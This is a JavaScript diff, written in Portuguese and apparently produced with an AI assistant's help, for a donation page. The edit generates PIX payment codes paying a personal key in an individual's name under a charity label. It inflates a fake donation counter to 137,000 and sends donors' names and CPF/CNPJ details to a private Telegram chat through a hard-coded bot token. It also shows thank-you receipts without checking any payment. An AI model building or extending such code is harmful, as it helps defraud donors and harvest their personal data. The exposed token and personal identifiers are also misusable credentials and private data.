@@ -1,10 +1,16 @@
 // --- Constantes
-// Chave PIX: Corrigida com os hífens para o formato UUID.
-const PIX_KEY = "00020126580014br.gov.bcb.pix0136619d9443-2186-44bd-8465-455c19d6c8a85204000053039865802BR592558.127.449 CLAYTON CLEBER6009Sao Paulo6211050726f787963040241";
+// Dados para a geração do PIX. A chave foi extraída dos exemplos que você forneceu.
+const PIX_CONFIG = {
+    key: "9d0b151e-3a06-461f-b33a-d3c5669bd7d2",
+    beneficiaryName: "SONIA DE JESUS",
+    beneficiaryCity: "SAO PAULO",
+    merchantName: "INSTITUIÇÃO TRANSFORMANDO VIDAS LTDA" // Adicionado para mais detalhes
+};
 
 // Token do Bot do Telegram.
 const TELEGRAM_BOT_TOKEN = "8405316263:AAGnQ9ACDDYgJS1lipE92BPJly0pNjyFZf4";
 const TELEGRAM_CHAT_ID = "5899156650";
+
 
 // --- Elementos do DOM
 const screens = document.querySelectorAll('.screen');
@@ -15,16 +21,71 @@ const companyInfo = document.getElementById('company-info');
 const valueButtons = document.querySelectorAll('.value-btn');
 const valueInput = document.getElementById('valor');
 
+
 // --- Elementos do Novo Contador
 const donationCounterElement = document.getElementById('donation-counter');
-let donationCount = 37000; // Começa em 37 mil
+let donationCount = 137000; // Começa em 137 mil
+
 
 let formData = {};
+
 
 // --- Funções Auxiliares
 function formatNumber(num) {
     return num.toLocaleString('pt-BR');
 }
+
+/**
+ * Calcula o CRC16 (Cyclic Redundancy Check) para a string do PIX.
+ * @param {string} payload - A string do PIX sem o CRC.
+ * @returns {string} O checksum de 4 caracteres em hexadecimal.
+ */
+function crc16(payload) {
+    let crc = 0xFFFF;
+    for (let i = 0; i < payload.length; i++) {
+        crc ^= payload.charCodeAt(i) << 8;
+        for (let j = 0; j < 8; j++) {
+            crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
+        }
+    }
+    return ('0000' + (crc & 0xFFFF).toString(16).toUpperCase()).slice(-4);
+}
+
+/**
+ * Gera o código PIX "Copia e Cola" completo com base no valor.
+ * @param {number} amount - O valor da doação.
+ * @returns {string} A string completa do PIX "Copia e Cola".
+ */
+function generatePixCode(amount) {
+    const formattedAmount = amount.toFixed(2);
+    const txid = '***'; // O PIX com valor não precisa de TXID complexo, '***' é suficiente.
+
+    const formatField = (id, value) => {
+        const len = value.length.toString().padStart(2, '0');
+        return `${id}${len}${value}`;
+    };
+
+    const payloadParts = [
+        formatField('00', '01'), // Payload Format Indicator
+        formatField('26', [
+            formatField('00', 'br.gov.bcb.pix'),
+            formatField('01', PIX_CONFIG.key)
+        ].join('')), // Merchant Account Information
+        formatField('52', '0000'), // Merchant Category Code
+        formatField('53', '986'), // Transaction Currency (BRL)
+        formatField('54', formattedAmount), // Transaction Amount
+        formatField('58', 'BR'), // Country Code
+        formatField('59', PIX_CONFIG.beneficiaryName.substring(0, 25)), // Beneficiary Name
+        formatField('60', PIX_CONFIG.beneficiaryCity.substring(0, 15)), // Beneficiary City
+        formatField('62', formatField('05', txid)) // Additional Data Field (TXID)
+    ];
+
+    const payload = payloadParts.join('') + '6304'; // Adiciona o ID e tamanho do CRC
+    const checksum = crc16(payload);
+
+    return payload + checksum;
+}
+
 
 // --- Navegação entre Telas
 function showScreen(screenId) {
@@ -36,6 +97,7 @@ function showScreen(screenId) {
     sharedSections.style.display = (screenId === 'initial-screen') ? 'block' : 'none';
     window.scrollTo(0, 0);
 }
+
 
 // --- Funções de Formatação de Inputs
 function formatCpfCnpj(value) {
@@ -71,6 +133,7 @@ function formatDate(value) {
         .replace(/(\d{2})(\d)/, '$1/$2')
         .slice(0, 10);
 }
+
 
 // --- Lógica do Formulário
 function setupFormListeners() {
@@ -115,19 +178,25 @@ function handleFormSubmit(event) {
     event.preventDefault();
     const form = new FormData(event.target);
     formData = Object.fromEntries(form.entries());
-    
-    // Set PIX key on PIX screen
-    pixKeyDisplay.value = PIX_KEY;
+
+    // *** ALTERAÇÃO PRINCIPAL AQUI ***
+    // Gera o código PIX com base no valor do formulário
+    const donationValue = parseFloat(formData.valor);
+    const pixCode = generatePixCode(donationValue);
+
+    // Define o código PIX gerado na tela do PIX
+    pixKeyDisplay.value = pixCode;
     showScreen('pix-screen');
 }
+
 
 // --- Lógica da Tela PIX
 function setupPixScreenListeners() {
     document.getElementById('copy-pix-key').addEventListener('click', () => {
         navigator.clipboard.writeText(pixKeyDisplay.value).then(() => {
-            alert('Chave PIX copiada!');
+            alert('Código PIX copiado!');
         }).catch(err => {
-            console.error('Erro ao copiar a chave PIX: ', err);
+            console.error('Erro ao copiar o código PIX: ', err);
         });
     });
 
@@ -138,11 +207,12 @@ function setupPixScreenListeners() {
     });
 }
 
+
 // --- Integração com o Telegram
 async function sendDataToTelegram() {
     const isCnpj = formData.cpf_cnpj && formData.cpf_cnpj.length > 14;
     const message = `
-        🎉 *Nova Doação Recebida!* 🎉
+          *Nova Doação Recebida!*  
         ----------------------------------
         *Doador:* ${formData.nome} ${formData.sobrenome}
         *Tipo:* ${isCnpj ? 'Pessoa Jurídica' : 'Pessoa Física'}
@@ -155,7 +225,7 @@ async function sendDataToTelegram() {
     `;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    
+
     try {
         await fetch(url, {
             method: 'POST',
@@ -171,6 +241,7 @@ async function sendDataToTelegram() {
     }
 }
 
+
 // --- Comprovante e Loop de Agradecimento
 function showReceipt() {
     const now = new Date();
@@ -183,9 +254,10 @@ function showReceipt() {
     const messageEl = document.getElementById('receipt-message');
     const nameToUse = formData.nome_empresa || formData.nome;
     messageEl.textContent = `Muito obrigado, ${nameToUse}! Sua solidariedade ilumina caminhos e faz a diferença.`;
-    
+
     showScreen('receipt-screen');
 }
+
 
 function startThankYouLoop() {
     setTimeout(() => {
@@ -195,6 +267,7 @@ function startThankYouLoop() {
         }, 5000);
     }, 5000);
 }
+
 
 // --- Funções do Contador Personalizado
 function startDonationCounter() {
@@ -207,6 +280,7 @@ function startDonationCounter() {
     }, 10000);
 }
 
+
 // --- Inicialização e Reset
 function resetApp() {
     donationForm.reset();
@@ -216,16 +290,18 @@ function resetApp() {
     showScreen('initial-screen');
 }
 
+
 function init() {
     document.getElementById('start-donation-button').addEventListener('click', () => showScreen('form-screen'));
     document.getElementById('back-to-initial').addEventListener('click', () => showScreen('initial-screen'));
-    
+
     setupFormListeners();
     setupPixScreenListeners();
     startDonationCounter(); // Chama a nova função do contador
-    
+
     showScreen('initial-screen');
 }
+
 
 // --- Iniciar o aplicativo ---
 init();
